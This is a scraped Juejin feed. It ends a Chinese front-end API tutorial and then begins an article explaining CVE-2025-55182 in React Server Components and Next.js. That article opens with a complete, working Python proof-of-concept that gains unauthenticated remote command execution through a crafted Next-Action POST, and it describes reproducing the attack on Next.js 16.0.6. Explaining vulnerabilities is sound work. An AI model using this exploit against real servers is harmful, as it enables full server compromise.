history.<span class="hljs-title function_">replaceState</span>(
    { <span class="hljs-attr">page</span>: <span class="hljs-string">'home'</span> },
    <span class="hljs-string">'首页'</span>,
    <span class="hljs-string">'/home'</span>
);

<span class="hljs-comment">// 3. 监听popstate事件（用户点击前进/后退按钮）</span>
<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'popstate'</span>, <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (event.<span class="hljs-property">state</span>) {
        <span class="hljs-comment">// 根据state恢复页面状态</span>
        <span class="hljs-title function_">restorePageState</span>(event.<span class="hljs-property">state</span>);
    }
});
</code></pre>
<h3 data-id="heading-16">实际应用：构建简单的SPA路由</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 定义路由</span>
<span class="hljs-keyword">const</span> routes = {
    <span class="hljs-string">'/'</span>: <span class="hljs-string">'home.html'</span>,
    <span class="hljs-string">'/about'</span>: <span class="hljs-string">'about.html'</span>,
    <span class="hljs-string">'/contact'</span>: <span class="hljs-string">'contact.html'</span>
};

<span class="hljs-comment">// 初始化</span>
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'DOMContentLoaded'</span>, <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// 拦截链接点击</span>
    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
        <span class="hljs-keyword">if</span> (e.<span class="hljs-property">target</span>.<span class="hljs-title function_">matches</span>(<span class="hljs-string">'[data-link]'</span>)) {
            e.<span class="hljs-title function_">preventDefault</span>();
            <span class="hljs-title function_">navigateTo</span>(e.<span class="hljs-property">target</span>.<span class="hljs-property">href</span>);
        }
    });
    
    <span class="hljs-comment">// 监听浏览器前进后退</span>
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'popstate'</span>, loadContent);
    
    <span class="hljs-comment">// 加载初始内容</span>
    <span class="hljs-title function_">loadContent</span>();
});

<span class="hljs-keyword">function</span> <span class="hljs-title function_">navigateTo</span>(<span class="hljs-params">url</span>) {
    <span class="hljs-keyword">const</span> path = <span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(url).<span class="hljs-property">pathname</span>;
    
    <span class="hljs-comment">// 更新浏览器地址栏，不刷新页面</span>
    history.<span class="hljs-title function_">pushState</span>({ path }, <span class="hljs-string">''</span>, url);
    
    <span class="hljs-comment">// 加载内容</span>
    <span class="hljs-title function_">loadContent</span>(path);
}

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">loadContent</span>(<span class="hljs-params">path = location.pathname</span>) {
    <span class="hljs-keyword">const</span> page = routes[path] || <span class="hljs-string">'404.html'</span>;
    
    <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`pages/<span class="hljs-subst">${page}</span>`</span>);
        <span class="hljs-keyword">const</span> content = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">text</span>();
        
        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'content'</span>).<span class="hljs-property">innerHTML</span> = content;
        <span class="hljs-variable language_">document</span>.<span class="hljs-property">title</span> = <span class="hljs-string">`我的网站 - <span class="hljs-subst">${path.substring(<span class="hljs-number">1</span>) || <span class="hljs-string">'首页'</span>}</span>`</span>;
    } <span class="hljs-keyword">catch</span> (error) {
        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'content'</span>).<span class="hljs-property">innerHTML</span> = <span class="hljs-string">'&lt;h2&gt;页面加载失败&lt;/h2&gt;'</span>;
    }
}
</code></pre>
<h2 data-id="heading-17">三大API的综合应用示例</h2>
<p>让我们创建一个简单的待办事项应用，综合运用这三个API：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>我的待办事项<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
        <span class="hljs-selector-class">.completed</span> { <span class="hljs-attribute">text-decoration</span>: line-through; <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0.6</span>; }
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>待办事项<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"todoInput"</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"输入新任务"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">"addTodo()"</span>&gt;</span>添加<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"todoList"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">"filterTodos('all')"</span>&gt;</span>全部<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">"filterTodos('active')"</span>&gt;</span>未完成<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">"filterTodos('completed')"</span>&gt;</span>已完成<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
        <span class="hljs-comment">// 从LocalStorage加载数据</span>
        <span class="hljs-keyword">let</span> todos = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'todos'</span>)) || [];
        <span class="hljs-keyword">let</span> currentFilter = <span class="hljs-string">'all'</span>;

        <span class="hljs-comment">// 页面加载时初始化</span>
        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'DOMContentLoaded'</span>, <span class="hljs-keyword">async</span> () =&gt; {
            <span class="hljs-title function_">renderTodos</span>();
            
            <span class="hljs-comment">// 从服务器获取初始数据（如果本地没有）</span>
            <span class="hljs-keyword">if</span> (todos.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) {
                <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchInitialTodos</span>();
            }
            
            <span class="hljs-comment">// 初始化历史状态</span>
            history.<span class="hljs-title function_">replaceState</span>({ <span class="hljs-attr">filter</span>: <span class="hljs-string">'all'</span> }, <span class="hljs-string">'全部任务'</span>, <span class="hljs-string">'#all'</span>);
        });

        <span class="hljs-comment">// 监听浏览器前进后退</span>
        <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'popstate'</span>, <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> {
            <span class="hljs-keyword">if</span> (event.<span class="hljs-property">state</span> &amp;&amp; event.<span class="hljs-property">state</span>.<span class="hljs-property">filter</span>) {
                currentFilter = event.<span class="hljs-property">state</span>.<span class="hljs-property">filter</span>;
                <span class="hljs-title function_">renderTodos</span>();
            }
        });

        <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchInitialTodos</span>(<span class="hljs-params"/>) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'https://api.example.com/todos'</span>);
                <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();
                todos = data;
                <span class="hljs-title function_">saveToLocalStorage</span>();
                <span class="hljs-title function_">renderTodos</span>();
            } <span class="hljs-keyword">catch</span> (error) {
                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'使用本地数据'</span>);
            }
        }

        <span class="hljs-keyword">function</span> <span class="hljs-title function_">addTodo</span>(<span class="hljs-params"/>) {
            <span class="hljs-keyword">const</span> input = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'todoInput'</span>);
            <span class="hljs-keyword">const</span> text = input.<span class="hljs-property">value</span>.<span class="hljs-title function_">trim</span>();
            
            <span class="hljs-keyword">if</span> (text) {
                todos.<span class="hljs-title function_">push</span>({
                    <span class="hljs-attr">id</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(),
                    <span class="hljs-attr">text</span>: text,
                    <span class="hljs-attr">completed</span>: <span class="hljs-literal">false</span>,
                    <span class="hljs-attr">createdAt</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">toISOString</span>()
                });
                
                input.<span class="hljs-property">value</span> = <span class="hljs-string">''</span>;
                <span class="hljs-title function_">saveToLocalStorage</span>();
                <span class="hljs-title function_">renderTodos</span>();
            }
        }

        <span class="hljs-keyword">function</span> <span class="hljs-title function_">toggleTodo</span>(<span class="hljs-params">id</span>) {
            <span class="hljs-keyword">const</span> todo = todos.<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">t</span> =&gt;</span> t.<span class="hljs-property">id</span> === id);
            <span class="hljs-keyword">if</span> (todo) {
                todo.<span class="hljs-property">completed</span> = !todo.<span class="hljs-property">completed</span>;
                <span class="hljs-title function_">saveToLocalStorage</span>();
                <span class="hljs-title function_">renderTodos</span>();
            }
        }

        <span class="hljs-keyword">function</span> <span class="hljs-title function_">changeFilter</span>(<span class="hljs-params">filter</span>) {
            currentFilter = filter;
            
            <span class="hljs-comment">// 更新URL和历史记录</span>
            history.<span class="hljs-title function_">pushState</span>(
                { <span class="hljs-attr">filter</span>: filter },
                <span class="hljs-string">`<span class="hljs-subst">${filter}</span>任务`</span>,
                <span class="hljs-string">`#<span class="hljs-subst">${filter}</span>`</span>
            );
            
            <span class="hljs-title function_">renderTodos</span>();
        }

        <span class="hljs-keyword">function</span> <span class="hljs-title function_">renderTodos</span>(<span class="hljs-params"/>) {
            <span class="hljs-keyword">const</span> filteredTodos = todos.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">todo</span> =&gt;</span> {
                <span class="hljs-keyword">if</span> (currentFilter === <span class="hljs-string">'active'</span>) <span class="hljs-keyword">return</span> !todo.<span class="hljs-property">completed</span>;
                <span class="hljs-keyword">if</span> (currentFilter === <span class="hljs-string">'completed'</span>) <span class="hljs-keyword">return</span> todo.<span class="hljs-property">completed</span>;
                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
            });

            <span class="hljs-keyword">const</span> list = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'todoList'</span>);
            list.<span class="hljs-property">innerHTML</span> = filteredTodos.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">todo</span> =&gt;</span> <span class="hljs-string">`
                &lt;li onclick="toggleTodo(<span class="hljs-subst">${todo.id}</span>)" 
                    class="<span class="hljs-subst">${todo.completed ? <span class="hljs-string">'completed'</span> : <span class="hljs-string">''</span>}</span>"&gt;
                    <span class="hljs-subst">${todo.text}</span>
                    &lt;small&gt;<span class="hljs-subst">${<span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>(todo.createdAt).toLocaleDateString()}</span>&lt;/small&gt;
                &lt;/li&gt;
            `</span>).<span class="hljs-title function_">join</span>(<span class="hljs-string">''</span>);
        }

        <span class="hljs-keyword">function</span> <span class="hljs-title function_">saveToLocalStorage</span>(<span class="hljs-params"/>) {
            <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">'todos'</span>, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(todos));
        }

        <span class="hljs-comment">// 为按钮绑定事件</span>
        <span class="hljs-variable language_">window</span>.<span class="hljs-property">filterTodos</span> = changeFilter;
        <span class="hljs-variable language_">window</span>.<span class="hljs-property">addTodo</span> = addTodo;
        <span class="hljs-variable language_">window</span>.<span class="hljs-property">toggleTodo</span> = toggleTodo;
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<h2 data-id="heading-18">总结对比</h2>









































<table><thead><tr><th>特性</th><th>LocalStorage</th><th>Fetch API</th><th>History API</th></tr></thead><tbody><tr><td><strong>主要用途</strong></td><td>本地数据存储</td><td>网络请求</td><td>历史记录管理</td></tr><tr><td><strong>数据持久性</strong></td><td>永久存储</td><td>临时请求</td><td>会话期间</td></tr><tr><td><strong>是否需要网络</strong></td><td>否</td><td>是</td><td>否</td></tr><tr><td><strong>典型应用</strong></td><td>用户偏好、离线数据</td><td>获取API数据、提交表单</td><td>SPA路由、页面状态</td></tr><tr><td><strong>异步操作</strong></td><td>同步</td><td>异步</td><td>同步/异步</td></tr></tbody></table>
<h2 data-id="heading-19">最佳实践建议</h2>
<ol>
<li>
<p><strong>LocalStorage</strong>：</p>
<ul>
<li>不要存储敏感信息（密码、令牌等）</li>
<li>存储前压缩大数据</li>
<li>定期清理过期数据</li>
</ul>
</li>
<li>
<p><strong>Fetch API</strong>：</p>
<ul>
<li>始终添加错误处理</li>
<li>设置请求超时</li>
<li>使用适当的请求头</li>
</ul>
</li>
<li>
<p><strong>History API</strong>：</p>
<ul>
<li>确保URL变化与内容同步</li>
<li>提供有意义的state对象</li>
<li>处理浏览器前进/后退按钮</li>
</ul>
</li>
</ol>
<p>这三个API是现代前端开发的基石，掌握它们将让你能够构建更加流畅、响应迅速的Web应用。从今天开始尝试在你的项目中使用它们吧！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[为什么React的漏洞能攻破服务器？Next.js与RSC入门基础]]></title>    <link>https://juejin.cn/post/7581619505584341043</link>    <guid>https://juejin.cn/post/7581619505584341043</guid>    <pubDate>2025-12-09T03:19:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581619505584341043" data-draft-id="7581470169839910950" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="为什么React的漏洞能攻破服务器？Next.js与RSC入门基础"/> <meta itemprop="keywords" content="前端,安全,数据库"/> <meta itemprop="datePublished" content="2025-12-09T03:19:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="技术爬爬虾"/> <meta itemprop="url" content="https://juejin.cn/user/2316024294412667"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            为什么React的漏洞能攻破服务器？Next.js与RSC入门基础
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2316024294412667/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    技术爬爬虾
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T03:19:14.000Z" title="Tue Dec 09 2025 03:19:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">视频版：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1Bw21BrEig%2F" target="_blank" title="https://www.bilibili.com/video/BV1Bw21BrEig/" ref="nofollow noopener noreferrer">www.bilibili.com/video/BV1Bw…</a></h2>
<p>只需要向着网页地址 POST 请求这么一段特殊的数据，就能直接攻破网页的服务器端，为所欲为。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> json

BASE_URL = sys.argv[<span class="hljs-number">1</span>] <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-string">"http://localhost:3000"</span>
EXECUTABLE = sys.argv[<span class="hljs-number">2</span>] <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">2</span> <span class="hljs-keyword">else</span> <span class="hljs-string">"calc"</span>

crafted_chunk = {
    <span class="hljs-string">"then"</span>: <span class="hljs-string">"$1:__proto__:then"</span>,
    <span class="hljs-string">"status"</span>: <span class="hljs-string">"resolved_model"</span>,
    <span class="hljs-string">"reason"</span>: -<span class="hljs-number">1</span>,
    <span class="hljs-string">"value"</span>: <span class="hljs-string">'{"then": "$B0"}'</span>,
    <span class="hljs-string">"_response"</span>: {
        <span class="hljs-string">"_prefix"</span>: <span class="hljs-string">f"var res = process.mainModule.require('child_process').execSync('<span class="hljs-subst">{EXECUTABLE}</span>',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});"</span>,
        <span class="hljs-comment"># If you don't need the command output, you can use this line instead:</span>
        <span class="hljs-comment"># "_prefix": f"process.mainModule.require('child_process').execSync('{EXECUTABLE}');",</span>
        <span class="hljs-string">"_formData"</span>: {
            <span class="hljs-string">"get"</span>: <span class="hljs-string">"$1:constructor:constructor"</span>,
        },
    },
}

files = {
    <span class="hljs-string">"0"</span>: (<span class="hljs-literal">None</span>, json.dumps(crafted_chunk)),
    <span class="hljs-string">"1"</span>: (<span class="hljs-literal">None</span>, <span class="hljs-string">'"$@0"'</span>),
}

headers = {<span class="hljs-string">"Next-Action"</span>: <span class="hljs-string">"x"</span>}
res = requests.post(BASE_URL, files=files, headers=headers, timeout=<span class="hljs-number">10</span>)
<span class="hljs-built_in">print</span>(res.status_code)
<span class="hljs-built_in">print</span>(res.text)
</code></pre>
<p>比如这个命令 <strong>calc</strong> 是打开电脑上的计算器，我执行一下这个 Python 脚本，竟然真的打开了电脑上的计算器。 这就是前几天爆出的 React 生态的严重漏洞 CVE-2025-55182，评级是 10 分，是最高危险级别的漏洞。攻击者不需要任何授权，只需要通过你网站的公开地址，就能在你的服务器上执行任意的恶意代码。相信很多观众朋友们都会有一个疑惑，React 不是一个类似于 VUE 的前端框架吗？为什么前端框架的漏洞能影响到服务器上面，还能被黑客攻击服务器？其实 React 发展至今，已经不是一个纯的前端库了，而是具备了前后端一体的全栈架构。本期视频我们就以这个漏洞作为引子，介绍下 React 生态近几年的最大更新，也就是 React Server Component，React 服务器端组件，简称 RSC。</p>
<h2 data-id="heading-1">React Server Component (RSC)</h2>
<p>简单来说，RSC 允许组件的代码在服务器端运行，最终只把 HTML 结果传递给客户端，而不再把逻辑都放到前端的 Javascript 里面。这次漏洞就是服务器组件（RSC）的反序列化漏洞，黑客攻击的是服务器端（RSC）的反序列化功能，从而导致黑客可以直接攻破服务器。</p>
<p>在 2020 年，React 的核心团队提出了 RSC 的概念。两年后 Vercel 公司在 Next.js 13 版本率先开始支持 RSC。事实上，Next.js 母公司 Vercel 就是这几年 RSC 背后最大的推手。Vercel 希望通过 RSC 把整个 React 生态绑到自家的部署平台 vercel.com 上面，当然他们也取得了成功。据统计，全球新建的 React 项目里面，有 70% 直接选用了 Next.js 框架加 Vercel 平台进行部署，这一步棋也给 Vercel 平台带来了巨大的收入增长。到目前为止，Next.js 是唯一一个在生产环境完整支持了 RSC (服务器组件) 的框架。我们在社区里面提到 RSC (服务器组件)，几乎就等于 Next.js。所以这次漏洞 Next.js 框架首当其冲，Next.js 也是受到漏洞影响最大的重灾区。本期视频，我们先来简单介绍并且回顾下这次的漏洞，然后我们再来实战介绍下 Next.js 与 RSC。</p>
<h2 data-id="heading-2">漏洞攻击复现</h2>
<p>我们先在电脑上复现一下这次的攻击。我来到桌面，右键在终端打开，然后我们执行这个命令，创建一个 Next.js 项目。<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e9ec5d80be3d40c9b5cfe83cd7e2e6f6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oqA5pyv54is54is6Jm-:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765855154&amp;x-signature=YXfAoL2hEfAnS1k0ReUIdqwO53s%3D" alt="" loading="lazy"/> 这里最新的版本 16.0.7 已经修复了这个漏洞，所以我回退一个版本，用 16.0.6 来复现一下攻击过程。 执行这个命令的前提是，你电脑上需要安装过 Node.js。回车，这里输入一个项目的名字，我叫 <code>next-test</code>，回车，然后一路点击回车就行了。命令执行完了，我们看到这里提示我们有一个致命级的安全漏洞。<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/161fcededb5a4ddc87ad96ed06195ce9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oqA5pyv54is54is6Jm-:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765855154&amp;x-signature=4%2BWBFdw77%2BCHxA2bci8H%2Fv91cnU%3D" alt="" loading="lazy"/> 然后我们进入刚才创建的文件夹，执行这个命令 <code>npm run dev</code>，把这个 Next.js 工程启动起来。<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/51be18780907491a97c3f5fe90325681~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oqA5pyv54is54is6Jm-:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765855154&amp;x-signature=M1oe7HkKbWmNRCwZEWVsujX6Sqs%3D" alt="" loading="lazy"/> 这里有一个本地地址就可以访问到项目的主页。这是一个 Next.js 项目最初始的状态，我没有修改一行代码。<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d561fb5974764ebaa5b22917d3aaeb82~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oqA5pyv54is54is6Jm-:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765855154&amp;x-signature=uyV3P0CMHPzNFQgrH0Lt3JyAb1Y%3D" alt="" loading="lazy"/></p>
<p>接下来我们来到 GitHub，找到跟这个漏洞同名的一个仓库，<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmsanft%2FCVE-2025-55182" target="_blank" title="https://github.com/msanft/CVE-2025-55182" ref="nofollow noopener noreferrer">github.com/msanft/CVE-…</a></p>
